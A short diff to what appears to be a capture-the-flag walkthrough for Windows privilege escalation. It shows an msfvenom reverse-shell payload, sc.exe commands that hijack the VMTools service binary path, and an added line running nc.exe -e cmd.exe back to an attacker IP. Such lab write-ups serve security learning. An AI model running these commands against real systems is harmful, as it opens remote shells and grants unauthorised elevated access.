@@ -502,3 +502,8 @@ git clone http://43ce39bb0bd6bc489284f2905f033ca467a6362f@10.129.234.64:3000/ell
 2. create a rev shell file using msfvenom. `msfvenom -p windows/x64/shell_reverse_tcp -f exe -o rev.exe LHOST=10.10.15.99 LPORT=4444`
 3. change the binary path of any target service. `sc.exe config VMTools binPath="C:\Users\svc-printer\Documents\rev.exe"`
 4. restart the service. `sc.exe stop VMTools` `sc.exe start VMTools`
+
+or alternatively, in the step 3, execute nc.exe binary.
+```
+sc.exe config VMTools binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.15.99 4444"
+```
